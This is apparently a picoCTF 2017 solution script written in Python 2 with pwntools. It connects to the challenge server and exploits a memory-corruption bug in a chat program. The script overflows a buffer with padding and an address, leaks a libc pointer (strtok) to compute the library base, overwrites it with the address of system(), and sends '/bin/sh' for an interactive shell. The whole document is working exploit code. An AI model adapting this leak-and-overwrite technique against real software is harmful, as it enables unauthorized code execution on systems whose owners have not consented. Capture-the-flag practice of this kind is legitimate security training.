#!/usr/bin/env python2
from pwn import *
r = remote("shell2017.picoctf.com",33813)
r.recv()
r.send("find 2 You're not that funny.\n")
r.recv()
r.send("add 1337 %s\n"%("A"*21))
r.recv()
r.send("find 2 A\n")
r.recv()
r.send("add 1337 EOT%s\n"%("-"*100))
r.recv()
r.send("find 2 A\n")
r.recv()
r.send("edit %s\n"%("A"*22))
r.recv()
r.send("find 2 A\n")
r.recv()
r.send("edit %s\n"%("A"*46+"\xbe\x1e\x60"))
r.recv()
r.send("chat 2\n")
res = r.recvuntil("EOT---")
r.recv()
strtok_libc = int(res.splitlines()[-2][-6:][::-1].encode('hex'),16)
libc_base = strtok_libc-0x84a60
system_libc = libc_base+0x41490
r.send("edit %s\n"%(hex(system_libc)[2:].decode('hex')[::-1]))
r.recv()
r.send("/bin/sh\n")
r.interactive()